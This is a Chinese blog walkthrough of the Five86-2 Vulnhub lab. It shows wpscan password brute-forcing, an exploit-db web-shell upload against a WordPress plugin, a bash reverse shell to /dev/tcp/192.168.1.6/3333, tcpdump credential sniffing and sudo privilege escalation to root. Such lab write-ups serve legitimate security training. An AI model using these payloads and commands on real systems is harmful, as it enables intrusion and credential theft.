---
title: "Five86-2-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "538"
date: "2020-03-30 09:48:00"
---

[靶机地址][1]

靶机难度：初级+

## 工具及漏洞信息

- netdiscover
- nmap
- gobuster
- tcpdump

## 0x01 信息收集

### 扫描靶机

`netdiscover`的`-r`参数扫描`192.168.1.0/16`或者路由器管理界面查看有线连接的设备得到靶机`ip`

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.3
```

![][2]

可以看到开放的端口较少，但是我看到有`wordpress`

打开很卡很卡，加载半天才加载完。而且加载出来的页面是不完整的

![][3]

这个页面是可以修复为完整的界面的，抓包：

![][4]

发现对正常的响应包，响应的`url`为`http://five86-2/`，修改`hosts`文件即可：

```
Windows:C:\Windows\System32\drivers\etc\hosts
Linux:/etc/hosts
添加一行：靶机ip five86-2
```

然后就可以正常打开页面了：

![][5]

### wpscan

既然只有`wordpress`这一条路给我们走，那就只能直接上`wpscan`了

使用及数据库更新方法在我之前的文章《用 wpscan 对 wordpress 站点进行渗透》里面有

扫描用户：

```
wpscan --url 192.168.1.3 -e u
```

![][6]

有以下用户：

- admin
- barney
- gillian
- peter
- stephen

保存到`users.txt`中，接着使用`wpscan`进行密码爆破：

```
wpscan --url http://192.168.1.3 -U users.txt -P /usr/share/wordlists/rockyou.txt -t 100
(kali自带的rockyou.txt.gz文件需要先解压：gzip -d /usr/share/wordlists/rockyou.txt.gz)
```

最后爆破出来两个用户密码；

- barney：spooky1
- stephen: apollo1

## 0x02 RCE 反弹 shell

获得了账户密码之后，我们就可以登录上去搞事情了：

![][7]

刚才扫描的时候没有扫描出任何插件，但是上去有三个插件：

![][8]

挨个在[`exploit-db`][9]搜索后，我找到了一个`RCE`漏洞：

![][10]

```
# Exploit Title: Authenticated code execution in `insert-or-embed-articulate-content-into-wordpress` Wordpress plugin
# Description: It is possible to upload and execute a PHP file using the plugin option to upload a zip archive
# Date: june 2019
# Exploit Author: xulchibalraa
# Vendor Homepage: https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/
# Software Link: https://downloads.wordpress.org/plugin/insert-or-embed-articulate-content-into-wordpress.4.2995.zip
# Version: 4.2995 <= 4.2997
# Tested on: Wordpress 5.1.1, PHP 5.6
# CVE : -


## 1. Create a .zip archive with 2 files: index.html, index.php

echo "<html>hello</html>" > index.html
echo "<?php echo system($_GET['cmd']); ?>" > index.php
zip poc.zip index.html index.php

## 2. Log in to wp-admin with any user role that has access to the plugin functionality (by default even `Contributors` role have access to it)
## 3. Create a new Post -> Select `Add block` -> E-Learning -> Upload the poc.zip -> Insert as: Iframe -> Insert (just like in tutorial https://youtu.be/knst26fEGCw?t=44 ;)
## 4. Access the webshell from the URL displayed after upload similar to

http://website.com/wp-admin/uploads/articulate_uploads/poc/index.php?cmd=whoami
```

在`youtube`上有[简单的步骤教程][11]

我来跟着它做一遍，注意对应修改你的代码：

```
echo "<html>hello</html>" > index.html
index.php用vim写入以下内容
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.6/3333 0>&1'");
zip poc.zip index.html index.php
```

![][12]

写入`index.php`反弹`shell`的语句姿势很多，自行搜索

新建一篇文章，默认模板会让你添加块，选择`E-Learning`模块：

![][13]

点击上传，选择我们的`poc.zip`：

![][14]

![][15]

显示`upload complete`之后拉到最后点击`insert`，然后就会得到一个上传的路径：

![][16]

此时我的`shell`已经成功的上传到了靶机上，先在本机开启监听`nc -lvp 3333`

然后访问我们的`shell`:

```
http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php
```

本机成功拿到`shell`:

![][17]

## 0x03 tcpdump 抓包 ftp 账密

这个`shell`肯定不好用，老方法用`python`开启`tty`:

```
python -c 'import pty; pty.spawn("/bin/bash")' # 有些没有安装Python2，所以需要换成python3 -c
```

切换到`/home`目录下发现了我们之前爆破出来的账户：

![][18]

我们登录其中一个：`stephen: apollo1`，查看定时任务和`sudo -l`权限：

![][19]

无果，`id`查看组发现有一个`pcap`组

![][20]

`ip add`查看网卡发现有一个网络接口比较奇怪：

![][21]

`pcap`是和网络流量相关的，那我们使用流量工具`tcpdump`抓下包：

```
timeout 120 tcpdump -w soap.pcap -i vethb26451b
timeout 120：是用来控制 tcpdump 的超时时间为 120s
tcpdump -w 保存为文件，-i指定监听的网络接口
```

需要到根目录下执行，2 分钟后便会停止：

![][22]

然后我们再用`tcpdump`打开文件看一下：

```
tcpdump -r soap.pcap |more
```

![][23]

在包中发现了`ftp`账户的账号和密码：`paul:esomepasswford`，尝试切换过去

## 0x04 sudo 提权 root

切换过后习惯性`sudo -l`查看可执行的`sudo`命令：

![][24]

用`sudo`来以`peter`用户去运行`/usr/sbin/service`，并切换到`/bin/bash`

这个时候就成功切换到`peter`用户：

```
sudo -u peter /usr/sbin/service ../../bin/bash
```

![][25]

切换后再看下`peter`账户的`sudo`权限：

![][26]

可以以`root`用户无密码执行`/usr/bin/passwd`，那我们现在就可以直接更改`root`账户的密码了：

```
sudo -u root passwd root
```

![][27]

在`/root`目录下拿到`flag`:

![][28]

本文完。

PS:

**vulnhub 靶机简单难度的套路已经差不多做了一遍了，只有一两个新的知识点的靶机就不做了**
**接下来我会针对性地选择好玩的靶机，这个系列没几篇了吧(大概)**

参考文章：

- [VulnHub 通关日记-five86-2-Walkthrough][29]
- [five86 2 walkthrough vulnhub ctf][30]

[1]: https://www.vulnhub.com/entry/five86-2,418/
[2]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_095716.png
[3]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_100229.png
[4]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_101240.png
[5]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_101839.png
[6]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_102125.png
[7]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_103643.png
[8]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_103157.png
[9]: https://www.exploit-db.com/
[10]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_103920.png
[11]: https://youtu.be/knst26fEGCw?t=44
[12]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_105145.png
[13]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_140110.png
[14]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_140334.png
[15]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_140925.png
[16]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_140956.png
[17]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_142334.png
[18]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_142738.png
[19]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_143212.png
[20]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_143404.png
[21]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_143757.png
[22]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_144656.png
[23]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_150009.png
[24]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_150242.png
[25]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_150429.png
[26]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_150524.png
[27]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_150948.png
[28]: https://img.soapffz.com/archives_img/2020/03/30/archives_20200330_150831.png
[29]: https://mp.weixin.qq.com/s/V2V03UKaQgQaq3oXcZGvmQ
[30]: https://www.hacknos.com/five86-2-walkthrough-vulnhub-ctf/